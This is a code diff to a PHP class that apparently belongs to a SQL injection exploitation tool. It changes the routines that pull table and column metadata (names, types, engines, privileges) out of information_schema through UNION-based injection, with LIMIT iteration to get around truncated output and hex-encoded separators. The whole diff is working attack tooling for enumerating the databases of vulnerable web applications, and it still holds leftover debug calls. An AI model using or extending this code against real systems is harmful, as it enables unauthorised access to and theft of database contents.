@@ -310,21 +310,26 @@
 			//Hopefully we can count the registers and do a limit iteration	
 			//through that :)
 
-			private function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array()){
+			private function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array(),$count=NULL){
 
-				$count	=	$this->unionQuery("COUNT($value)",$from,$where,$group);
-				$count	=	$count[0];
+				if(is_null($count)){
+
+					$count	=	$this->unionQuery("COUNT($value)",$from,$where,$group);
+					$count	=	$count[0];
+
+				}
 
 				$restoreLimit	=	$this->_injection["limit"];
 				$results			=	array();
 
-				for($i=0;$i<$count;$i++){
+				for($i=0;$i<=$count;$i++){
 
 					$this->_injection["limit"]	=	array($i,1);
 					$result		=	$this->unionQuery($value,$from,$where,$group);	
-					$results[]	=	$result[0];
+					$results[$i]	=	$result[0];
 
 				}
+
 
 				$this->_injection["limit"]	=	$restoreLimit;
 
@@ -452,7 +457,9 @@
 
 				$dbSchema->setDbName($database);
 	
-				$select	=	"TABLE_NAME";
+				$separator	=	",0x3f";
+
+				$select	=	"TABLE_NAME,0x7c,TABLE_TYPE,0x7c,ENGINE,0x7c,TABLE_COLLATION,0x7c,IF(AUTO_INCREMENT,1,0)".$separator;
 				$from		=	"information_schema.tables";
 				$where	=	array("table_schema=".\String::hexEncode($database));
 
@@ -461,8 +468,12 @@
 			
 				if($this->detectTruncatedData($tables)){
 
-					$tables	=	$this->unionQueryIterateLimit($select,$from,$where);
-
+					$count	=	$this->unionQuery("COUNT(TABLE_NAME)",$from,$where);	
+					$count	=	$count[0]-1;
+					$select	=	substr($select,0,(strlen($separator)*-1));
+					$tables	=	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);
+					var_dump($tables);
+					die();
 				}else{
 
 					$tables	=	explode(',',$tables);
@@ -496,10 +507,13 @@
 
 				}
 
+				$separator	=	",0x3f";
+
 				$this->log("Fetching table \"$table\" columns ...",0,"white");
 
-				$select							=	"COLUMN_NAME";
+				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,PRIVILEGES".$separator;
 				$from								=	"information_schema.columns";
+
 				$where							=	array(
 																	"table_schema=".\String::hexEncode($database),
 																	"AND",
@@ -509,24 +523,54 @@
 				$columns =	$this->unionQuery("GROUP_CONCAT($select)",$from,$where);	
 				$columns	=	$columns[0];
 
+				if(!$columns){
+					return FALSE;
+				}
+
+				$retColumns	=	array();
+
 				if($this->detectTruncatedData($columns)){
 
-					$columns = $this->unionQueryIterateLimit($select,$from,$where);
-					return array($columns[0]);
+					$count	=	$this->unionQuery("COUNT(COLUMN_NAME)",$from,$where);	
+					$count	=	$count[0];
+
+					$select	=	substr($select,0,(strlen($separator)*-1));
+					$columns =	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);
+
+					foreach($columns as $column){
+
+						$column	=	explode('|',$column);
+						$tmpCol["name"]		=	$column[0];
+						$tmpCol["type"]		=	$column[1];
+						$tmpCol["privilege"]	=	explode(',',$column[2]);
+
+						$retColumns[]	=	$tmpCol;
+
+					}
 
 				}else{
 
-					$columns = explode(',',$columns);
+					$columns		=	explode('?',$columns);
 
-					if(!is_array($columns)){
+					foreach($columns as $column){
 
-						$columns	=	array();
+						if(empty($column)){
+							continue;
+						}
+	
+						$column	=	explode('|',$column);
+
+						$tmpCol["name"]		=	$column[0];
+						$tmpCol["type"]		=	$column[1];
+						$tmpCol["privilege"]	=	explode(',',$column[2]);
+
+						$retColumns[]	=	$tmpCol;
 
 					}
 					
 				}
 
-				return $columns;
+				return $retColumns;
 
 			}
 
